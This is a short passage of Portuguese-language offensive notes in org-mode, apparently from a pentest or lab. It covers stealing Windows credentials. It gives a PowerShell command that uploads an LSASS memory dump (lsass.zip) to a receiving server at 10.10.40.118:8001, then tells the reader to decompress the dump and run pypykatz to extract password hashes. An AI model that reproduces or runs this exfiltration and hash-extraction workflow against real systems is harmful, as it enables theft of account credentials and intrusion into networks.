...
python server para receber estes dados -->
#+begin_src python
#!/usr/bin/env python3
...
enviando os dados para o python server -->
#+begin_src powershell
Invoke-WebRequest -Uri "http://10.10.40.118:8001/lsass.zip" -Method Post -InFile "C:\Users\Public\lsass.zip" -Verbose"
#+end_src

* data unzip
ao receber o arquivo comprimido, descomprimir e utilizar o ~pypykatz~ para verificar o mais importante, os hashs -->
